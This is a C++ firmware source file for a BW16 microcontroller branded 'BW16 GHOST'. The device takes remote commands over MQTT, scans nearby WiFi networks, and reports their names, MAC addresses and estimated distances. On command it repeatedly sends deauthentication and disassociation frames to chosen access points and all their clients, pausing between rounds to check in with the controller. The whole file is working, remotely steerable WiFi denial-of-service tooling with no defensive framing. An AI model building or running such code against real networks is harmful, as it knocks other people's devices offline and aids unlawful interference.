#include "bw16_remote_control.h"
#include "bw16_config.h"
#include "wifi_manager_attack.h"
#include "src/packet-injection/packet-injection.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "sys_api.h"
#include <math.h>

// ============================================
// STATIC MEMBER DEFINITIONS
// ============================================
WiFiSSLClient RemoteControl::wifiClient;
PubSubClient RemoteControl::mqtt(wifiClient);
bool RemoteControl::attackTriggered = false;
bool RemoteControl::attackModeActive = false;
bool RemoteControl::attackPaused = false;
unsigned long RemoteControl::lastStatusTime = 0;
unsigned long RemoteControl::lastCheckTime = 0;
unsigned long RemoteControl::checkInterval = 30000; // 30 seconds attack
// unsigned long RemoteControl::checkInterval = 120000; // 2 minutes attack
unsigned long RemoteControl::checkInDuration = 30000; // 30 seconds check-in
unsigned long RemoteControl::attackRoundStart = 0;
uint16_t RemoteControl::lastReason = 5;
uint16_t RemoteControl::savedReason = 5;
std::vector<AttackTarget> RemoteControl::attackTargets;
std::vector<AttackTarget> RemoteControl::savedAttackTargets;
std::vector<ScannedNetwork> RemoteControl::scanResults;
volatile bool RemoteControl::scanComplete = false;

// WiFi Manager for attack mode
WiFiManagerAttack wifiAttack;

// ============================================
// PUBLIC METHODS
// ============================================

void RemoteControl::begin() {
  Serial.println("\n╔══════════════════════════════════════╗");
  Serial.println("║     👻 BW16 GHOST INITIALIZING       ║");
  Serial.println("╚══════════════════════════════════════╝");
  
  // Initialize MQTT
  mqtt.setServer(MQTT_BROKER, MQTT_PORT);
  mqtt.setCallback(handleCommand);
  mqtt.setKeepAlive(30);
  mqtt.setBufferSize(16384);
  
#ifdef MQTT_ROOT_CA
  wifiClient.setRootCA(reinterpret_cast<unsigned char *>(const_cast<char *>(MQTT_ROOT_CA)));
#endif
  
  // Connect to WiFi
  Serial.println("\n📶 Connecting to WiFi...");
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  
  unsigned long startAttempt = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startAttempt < 30000) {
    delay(500);
    Serial.print(".");
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ WiFi connected");
    Serial.print("IP: ");
    Serial.println(localIpString());
    
    // Connect to MQTT
    if (connectMQTT()) {
      Serial.println("✅ MQTT connected");
      
      // Initial scan
      Serial.println("\n📡 Scanning networks...");
      if (scanNetworks()) {
        publishScanResults();
      }
      
      lastCheckTime = millis();
      Serial.println("\n✅ Ready!\n");
    } else {
      Serial.println("❌ MQTT connection failed");
    }
  } else {
    Serial.println("\n❌ WiFi connection failed");
  }
}

void RemoteControl::loop() {
  unsigned long currentTime = millis();
  
  // Handle attack mode
  if (attackModeActive) {
    if (!attackPaused) {
      // Check if attack round is complete (2 minutes)
      if (currentTime - attackRoundStart >= checkInterval) {
        Serial.println("\n⏸️ Attack round complete, checking in...");
        stopAttack();
        attackPaused = true;
        lastCheckTime = currentTime;
        
        // Reconnect to WiFi/MQTT for check-in
        performMQTTCheckIn();
      } else {
        // Continue attacking
        runAttackLoop();
      }
    } else {
      // Paused mode - stay connected to MQTT
      handlePausedMode();
    }
    return;
  }
  
  // Reset triggered flag if attack is not active
  if (!attackModeActive && attackTriggered) {
    attackTriggered = false;
    attackPaused = false;
  }
  
  // Standby mode
  if (!attackModeActive && !attackTriggered) {
    handleStandbyMode(currentTime);
    return;
  }
}

// ============================================
// PRIVATE METHODS
// ============================================

bool RemoteControl::connectMQTT() {
  if (WiFi.status() != WL_CONNECTED) return false;
  
  String clientId = String("bw16-") + DEVICE_ID + "-" + String(millis(), HEX);
  Serial.print("Connecting to MQTT...");
  
  if (!mqtt.connect(clientId.c_str(), MQTT_USER, MQTT_PASS)) {
    Serial.print(" failed, rc=");
    Serial.println(mqtt.state());
    return false;
  }
  
  Serial.println(" connected");
  mqtt.subscribe(TOPIC_CMD);
  mqtt.subscribe(TOPIC_CMD_RETAINED);
  mqtt.subscribe(TOPIC_BROADCAST);
  
  // Clear retained command immediately
  mqtt.publish(TOPIC_CMD_RETAINED, "", true);
  mqtt.loop();
  
  publishStatus("online");
  return true;
}

void RemoteControl::handleStandbyMode(unsigned long currentTime) {
  if (!mqtt.connected()) {
    connectMQTT();
  }
  mqtt.loop();
  
  // Periodic status update
  if (currentTime - lastStatusTime > 30000) {
    sendStatus();
    lastStatusTime = currentTime;
  }
}

void RemoteControl::handlePausedMode() {
  if (!mqtt.connected()) {
    connectMQTT();
  }
  mqtt.loop();
  
  // Check if check-in duration has elapsed (30 seconds)
  unsigned long currentTime = millis();
  if (currentTime - lastCheckTime >= checkInDuration) {
    Serial.println("▶️ Check-in complete, resuming attack...");
    
    // Disconnect MQTT and WiFi
    mqtt.disconnect();
    WiFi.disconnect();
    delay(100);
    
    // Resume attack
    attackPaused = false;
    attackRoundStart = millis();
    
    // Execute the attack
    executeAttack(savedAttackTargets, savedReason);
  }
}

void RemoteControl::performMQTTCheckIn() {
  Serial.println("\n⏰ MQTT Check-in...");
  
  // Reconnect WiFi for MQTT
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  unsigned long startAttempt = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startAttempt < 10000) {
    delay(100);
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    if (connectMQTT()) {
      // Send check-in status
      JsonDocument doc;
      doc["device"] = DEVICE_ID;
      doc["status"] = "checking_in";
      doc["mode"] = attackModeActive ? "attacking" : "standby";
      doc["paused"] = true;
      doc["uptime"] = millis() / 1000;
      doc["rssi"] = WiFi.RSSI();
      doc["ip"] = localIpString();
      doc["attack_duration"] = (millis() - attackRoundStart) / 1000;
      
      if (attackModeActive && savedAttackTargets.size() > 0) {
        doc["target_count"] = savedAttackTargets.size();
        JsonArray targets = doc["targets"].to<JsonArray>();
        for (const auto& t : savedAttackTargets) {
          JsonObject obj = targets.add<JsonObject>();
          obj["ssid"] = sanitizeSsid(t.ssid);
          char bssidStr[18];
          sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                  t.bssid[0], t.bssid[1], t.bssid[2],
                  t.bssid[3], t.bssid[4], t.bssid[5]);
          obj["bssid"] = bssidStr;
          obj["channel"] = t.channel;
        }
      }
      
      String json;
      serializeJson(doc, json);
      mqtt.publish(TOPIC_STATUS, json.c_str());
      mqtt.loop();
      
      // Listen for commands during check-in
      unsigned long start = millis();
      while (millis() - start < checkInDuration) {
        mqtt.loop();
        if (!attackModeActive) break;
        delay(10);
      }
      
      lastCheckTime = millis();
    }
  }
}

void RemoteControl::runAttackLoop() {
  if (attackTargets.empty()) return;
  
  // Execute attack on targets
  executeAttack(attackTargets, lastReason);
  
  // Small delay between attack rounds
  delay(1000);
}

void RemoteControl::executeAttack(const std::vector<AttackTarget>& targets, uint16_t reason) {
  wifiAttack.begin();
  
  for (const auto& target : targets) {
    Serial.print("📡 Setting channel: ");
    Serial.println(target.channel);
    
    if (!wifiAttack.setChannel(target.channel)) {
      Serial.println("❌ Failed to set channel");
      continue;
    }
    
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t targetMac[6];
    memcpy(targetMac, target.bssid, 6);
    
    Serial.print("👻 Attacking: ");
    Serial.println(target.ssid);
    
    // Send deauth packets
    for (int i = 0; i < 10; i++) {
      wifi_tx_deauth_frame(targetMac, broadcastMac, reason);
      delay(50);
      wifi_tx_deauth_frame(broadcastMac, targetMac, reason);
      delay(30);
      
      wifi_tx_disassoc_frame(targetMac, broadcastMac, reason);
      delay(50);
      wifi_tx_disassoc_frame(broadcastMac, targetMac, reason);
      delay(30);
    }
  }
  
  wifiAttack.end();
}

void RemoteControl::stopAttack() {
  // Stop any ongoing attack
  wifiAttack.end();
}

void RemoteControl::handleCommand(char* topic, byte* payload, unsigned int length) {
  // Skip empty payloads
  if (length == 0) {
    return;
  }
  
  String command;
  command.reserve(length);
  for (unsigned int i = 0; i < length; i++) {
    command += static_cast<char>(payload[i]);
  }
  command.trim();
  
  // Skip if command is empty after trimming
  if (command.length() == 0) {
    return;
  }
  
  Serial.print("MQTT command: ");
  Serial.println(command);
  
  if (command == "scan") {
    publishStatus("scanning");
    if (scanNetworks()) {
      publishScanResults();
    }
    publishStatus("standby");
  } else if (command == "status") {
    sendStatus();
  } else if (command == "restart") {
    publishStatus("restarting");
    mqtt.loop();
    delay(250);
    sys_reset();
  } else if (command == "stop_attack") {
    Serial.println("⏹️ Stopping attack");
    stopAttack();
    attackModeActive = false;
    attackTriggered = false;
    attackPaused = false;
    attackTargets.clear();
    savedAttackTargets.clear();
    publishStatus("attack_stopped");
    publishStatus("standby");
  } else if (command.startsWith("set_interval:")) {
    unsigned long interval = command.substring(13).toInt();
    if (interval >= 30000 && interval <= 600000) {
      checkInterval = interval;
      JsonDocument doc;
      doc["device"] = DEVICE_ID;
      doc["status"] = "interval_updated";
      doc["interval"] = interval;
      String json;
      serializeJson(doc, json);
      mqtt.publish(TOPIC_STATUS, json.c_str());
    } else {
      publishStatus("invalid_interval");
    }
  } else if (command.startsWith("multi_attack:")) {
    // Parse multi_attack command
    Bw16Command bwCmd = parseBw16Command(command);
    if (bwCmd.type == Bw16CommandType::MultiAttack) {
      // Convert to attack targets
      attackTargets.clear();
      for (const auto& target : bwCmd.targets) {
        AttackTarget at;
        memcpy(at.bssid, target.mac, 6);
        at.channel = target.channel;
        at.ssid = target.ssid;
        attackTargets.push_back(at);
      }
      
      if (attackTargets.empty() && bwCmd.targetMac[0] != 0) {
        // Single target fallback
        AttackTarget at;
        memcpy(at.bssid, bwCmd.targetMac, 6);
        at.channel = bwCmd.channel;
        at.ssid = bwCmd.targetSsid;
        attackTargets.push_back(at);
      }
      
      if (!attackTargets.empty()) {
        lastReason = 5;
        savedAttackTargets = attackTargets;
        savedReason = lastReason;
        attackModeActive = true;
        attackTriggered = true;
        attackPaused = false;
        attackRoundStart = millis();
        
        publishStatus("attack_starting");
        
        // Disconnect MQTT and start attack
        mqtt.disconnect();
        WiFi.disconnect();
        delay(100);
        
        // Start attack
        executeAttack(attackTargets, lastReason);
        publishStatus("attacking");
      } else {
        publishStatus("invalid_target");
      }
    } else {
      publishStatus("unsupported_command");
    }
  }
  
  // Clear retained command if needed
  if (String(topic) == TOPIC_CMD_RETAINED) {
    mqtt.publish(TOPIC_CMD_RETAINED, "", true);
  }
}

String RemoteControl::sanitizeSsid(const String& ssid) {
  String clean = ssid;
  for (unsigned int i = 0; i < clean.length(); i++) {
    const unsigned char c = static_cast<unsigned char>(clean[i]);
    if (c < 32 || c > 126) clean[i] = '?';
  }
  return clean;
}

String RemoteControl::localIpString() {
  const IPAddress ip = WiFi.localIP();
  char value[16];
  snprintf(value, sizeof(value), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  return String(value);
}

float RemoteControl::estimateDistance(short rssi) {
  // Free Space Path Loss (FSPL) formula
  // d = 10^((TxPower - RSSI) / (10 * n))
  constexpr float measuredPower = -45.0f;  // RSSI at 1 meter (calibrated)
  constexpr float pathLossExponent = 2.7f; // Free space path loss exponent
  return powf(10.0f, (measuredPower - rssi) / (10.0f * pathLossExponent));
}

void RemoteControl::publishStatus(const char* status) {
  if (!mqtt.connected()) return;
  
  JsonDocument doc;
  doc["device"] = DEVICE_ID;
  doc["status"] = status;
  doc["mode"] = attackModeActive ? "attacking" : "standby";
  doc["hardware"] = "BW16";
  doc["bands"] = "2.4GHz,5GHz";
  doc["uptime"] = millis() / 1000;
  doc["rssi"] = WiFi.RSSI();
  doc["ip"] = localIpString();
  
  String json;
  serializeJson(doc, json);
  mqtt.publish(TOPIC_STATUS, json.c_str());
}

void RemoteControl::sendStatus() {
  publishStatus(attackModeActive ? "attacking" : "standby");
}

rtw_result_t RemoteControl::scanResultHandler(rtw_scan_handler_result_t *scanResult) {
  if (scanResult->scan_complete != 0) {
    scanComplete = true;
    return RTW_SUCCESS;
  }
  
  rtw_scan_result_t *record = &scanResult->ap_details;
  const size_t ssidLength = (record->SSID.len < sizeof(record->SSID.val) - 1) 
                            ? record->SSID.len 
                            : sizeof(record->SSID.val) - 1;
  record->SSID.val[ssidLength] = 0;
  
  char bssid[18];
  snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
           record->BSSID.octet[0], record->BSSID.octet[1],
           record->BSSID.octet[2], record->BSSID.octet[3],
           record->BSSID.octet[4], record->BSSID.octet[5]);
  
  ScannedNetwork net;
  net.ssid = String(reinterpret_cast<const char *>(record->SSID.val));
  net.bssid = bssid;
  net.rssi = record->signal_strength;
  net.channel = record->channel;
  net.isTarget = false;
  
  scanResults.push_back(net);
  return RTW_SUCCESS;
}

bool RemoteControl::scanNetworks() {
  Serial.println("Scanning 2.4 GHz and 5 GHz networks...");
  scanResults.clear();
  scanComplete = false;
  
  if (wifi_scan_networks(scanResultHandler, nullptr) != RTW_SUCCESS) {
    Serial.println("WiFi scan could not be started");
    return false;
  }
  
  const unsigned long started = millis();
  while (!scanComplete && millis() - started < 15000) {
    mqtt.loop();
    delay(10);
  }
  
  Serial.print("Networks found: ");
  Serial.println(scanResults.size());
  return scanComplete;
}

void RemoteControl::publishScanResults() {
  if (!mqtt.connected()) return;
  
  JsonDocument doc;
  doc["device"] = DEVICE_ID;
  doc["type"] = "scan_results";
  doc["timestamp"] = millis();
  
  JsonArray networks = doc["networks"].to<JsonArray>();
  for (const auto& net : scanResults) {
    JsonObject obj = networks.add<JsonObject>();
    obj["ssid"] = sanitizeSsid(net.ssid);
    obj["bssid"] = net.bssid;
    obj["channel"] = net.channel;
    obj["rssi"] = net.rssi;
    obj["distance"] = roundf(estimateDistance(net.rssi) * 10.0f) / 10.0f;
    obj["is_target"] = net.isTarget;
    obj["band"] = net.channel <= 14 ? "2.4GHz" : "5GHz";
  }
  doc["total_networks"] = scanResults.size();
  
  String json;
  serializeJson(doc, json);
  mqtt.publish(TOPIC_SCAN, json.c_str());
  Serial.println("Scan results published");
}